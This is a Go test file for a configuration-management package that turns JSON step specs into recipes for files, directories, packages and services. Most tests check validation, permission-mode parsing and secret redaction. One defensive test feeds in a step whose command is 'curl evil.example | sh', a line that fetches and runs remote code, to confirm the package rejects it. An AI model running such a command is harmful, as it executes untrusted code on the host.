package recipe

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func TestSpecRoundTripsThroughJSON(t *testing.T) {
	spec := Spec{
		Name: "site",
		Steps: []StepSpec{
			{ID: "dir", Type: TypeDir, Path: "/srv/app", Mode: "0755"},
			{ID: "env", Type: TypeFile, Path: "/srv/app/.env", ContentB64: EncodeContent([]byte("A=1\n")), Mode: "0640", Sensitive: true},
			{ID: "pkg", Type: TypePackage, Name: "nginx"},
			{ID: "svc", Type: TypeService, Name: "nginx", State: ServiceRunning},
		},
	}

	data, err := json.Marshal(spec)
	if err != nil {
		t.Fatalf("Marshal: %v", err)
	}
	var back Spec
	if err := json.Unmarshal(data, &back); err != nil {
		t.Fatalf("Unmarshal: %v", err)
	}

	rec, err := back.Build(&fakeRunner{})
	if err != nil {
		t.Fatalf("Build: %v", err)
	}
	if rec.Name != "site" || len(rec.Steps) != 4 {
		t.Fatalf("recipe = %q with %d steps, want site with 4", rec.Name, len(rec.Steps))
	}
}

func TestSpecBuildsEachStepType(t *testing.T) {
	spec := Spec{Name: "all", Steps: []StepSpec{
		{ID: "a", Type: TypeFile, Path: "/tmp/a"},
		{ID: "b", Type: TypeDir, Path: "/tmp/b"},
		{ID: "c", Type: TypeSymlink, Path: "/tmp/c", Target: "/tmp/b"},
		{ID: "d", Type: TypeAbsent, Path: "/tmp/d"},
		{ID: "e", Type: TypeCommand, Name: "true"},
		{ID: "f", Type: TypePackage, Name: "nginx"},
		{ID: "g", Type: TypeService, Name: "nginx", State: ServiceReloaded},
	}}

	rec, err := spec.Build(&fakeRunner{})
	if err != nil {
		t.Fatalf("Build: %v", err)
	}
	if len(rec.Steps) != 7 {
		t.Fatalf("len(Steps) = %d, want 7", len(rec.Steps))
	}
	for i, step := range rec.Steps {
		if step.ID() == "" {
			t.Errorf("step %d has no id", i)
		}
		if step.Describe() == "" {
			t.Errorf("step %d has no description", i)
		}
	}
}

// The agent runs as root. An unrecognised step type must be refused outright
// rather than falling through to anything that executes.
func TestUnknownStepTypeIsRejected(t *testing.T) {
	spec := Spec{Name: "evil", Steps: []StepSpec{
		{ID: "x", Type: "shell", Name: "curl evil.example | sh"},
	}}

	_, err := spec.Build(&fakeRunner{})
	if !errors.Is(err, ErrUnknownStepType) {
		t.Fatalf("err = %v, want ErrUnknownStepType", err)
	}
}

func TestSpecRejectsIncompleteSteps(t *testing.T) {
	cases := map[string]StepSpec{
		"no id":                  {Type: TypeFile, Path: "/tmp/a"},
		"file without path":      {ID: "a", Type: TypeFile},
		"dir without path":       {ID: "a", Type: TypeDir},
		"symlink without target": {ID: "a", Type: TypeSymlink, Path: "/tmp/a"},
		"absent without path":    {ID: "a", Type: TypeAbsent},
		"command without name":   {ID: "a", Type: TypeCommand},
		"package without name":   {ID: "a", Type: TypePackage},
		"service without name":   {ID: "a", Type: TypeService, State: ServiceRunning},
		"service bad state":      {ID: "a", Type: TypeService, Name: "nginx", State: "sideways"},
	}
	for name, step := range cases {
		t.Run(name, func(t *testing.T) {
			if _, err := (Spec{Name: "t", Steps: []StepSpec{step}}).Build(&fakeRunner{}); err == nil {
				t.Fatal("expected error")
			}
		})
	}
}

func TestParseMode(t *testing.T) {
	good := map[string]uint32{"0640": 0o640, "755": 0o755, "0": 0, "": 0}
	for in, want := range good {
		got, err := parseMode(in)
		if err != nil {
			t.Errorf("parseMode(%q): %v", in, err)
			continue
		}
		if uint32(got) != want {
			t.Errorf("parseMode(%q) = %o, want %o", in, got, want)
		}
	}

	// Anything beyond permission bits is refused, so a spec cannot ask for
	// setuid.
	bad := []string{"4755", "0999", "abc", "07777", "-1"}
	for _, in := range bad {
		if _, err := parseMode(in); err == nil {
			t.Errorf("parseMode(%q) succeeded, want error", in)
		}
	}
}

func TestContentEncodingRoundTrip(t *testing.T) {
	// Arbitrary bytes, including ones that would not survive naive escaping.
	original := []byte("line1\nline2\x00\xff\xfe binary \"quotes\" and \\backslashes\\")
	spec := StepSpec{ID: "f", Type: TypeFile, Path: "/tmp/f", ContentB64: EncodeContent(original)}

	step, err := spec.build(&fakeRunner{})
	if err != nil {
		t.Fatalf("build: %v", err)
	}
	file, ok := step.(*StepFile)
	if !ok {
		t.Fatalf("step is %T, want *StepFile", step)
	}
	if string(file.Content) != string(original) {
		t.Errorf("content round trip failed:\n got %q\nwant %q", file.Content, original)
	}
}

func TestSpecRejectsBadBase64(t *testing.T) {
	spec := Spec{Name: "t", Steps: []StepSpec{
		{ID: "f", Type: TypeFile, Path: "/tmp/f", ContentB64: "!!!not base64!!!"},
	}}
	if _, err := spec.Build(&fakeRunner{}); err == nil {
		t.Fatal("expected error for invalid base64")
	}
}

// A spec that arrived as JSON must actually converge the host when run.
func TestSpecFromJSONConvergesHost(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("mode assertions are not meaningful on Windows")
	}

	dir := t.TempDir()
	raw := `{
	  "name": "site",
	  "steps": [
	    {"id": "root", "type": "dir", "path": "` + filepath.ToSlash(filepath.Join(dir, "srv")) + `", "mode": "0755"},
	    {"id": "env", "type": "file", "path": "` + filepath.ToSlash(filepath.Join(dir, "srv", ".env")) + `",
	     "content_b64": "` + EncodeContent([]byte("APP_ENV=production\n")) + `", "mode": "0640", "sensitive": true}
	  ]
	}`

	var spec Spec
	if err := json.Unmarshal([]byte(raw), &spec); err != nil {
		t.Fatalf("Unmarshal: %v", err)
	}
	rec, err := spec.Build(&fakeRunner{})
	if err != nil {
		t.Fatalf("Build: %v", err)
	}

	res, err := NewRunner().Run(context.Background(), rec)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if res.Failed {
		t.Fatalf("run failed: %+v", res.Steps)
	}
	if res.Changed != 2 {
		t.Errorf("Changed = %d, want 2", res.Changed)
	}

	envPath := filepath.Join(dir, "srv", ".env")
	content, err := os.ReadFile(envPath)
	if err != nil {
		t.Fatalf("ReadFile: %v", err)
	}
	if string(content) != "APP_ENV=production\n" {
		t.Errorf("content = %q", content)
	}
	info, err := os.Stat(envPath)
	if err != nil {
		t.Fatalf("Stat: %v", err)
	}
	if info.Mode().Perm() != 0o640 {
		t.Errorf("mode = %o, want 640", info.Mode().Perm())
	}

	// Second run must be clean, proving the spec path is idempotent too.
	res2, err := NewRunner().Run(context.Background(), rec)
	if err != nil {
		t.Fatalf("second Run: %v", err)
	}
	if res2.Changed != 0 {
		t.Errorf("second run Changed = %d, want 0", res2.Changed)
	}
}

// A sensitive file's contents must not reach a step description, which is
// what gets streamed into the deploy log.
func TestSensitiveSpecDoesNotLeakIntoDescriptions(t *testing.T) {
	spec := Spec{Name: "t", Steps: []StepSpec{
		{ID: "env", Type: TypeFile, Path: "/srv/.env",
			ContentB64: EncodeContent([]byte("DB_PASSWORD=hunter2\n")), Sensitive: true},
	}}
	rec, err := spec.Build(&fakeRunner{})
	if err != nil {
		t.Fatalf("Build: %v", err)
	}
	for _, step := range rec.Steps {
		if strings.Contains(step.Describe(), "hunter2") {
			t.Errorf("description leaked a secret: %q", step.Describe())
		}
	}
}
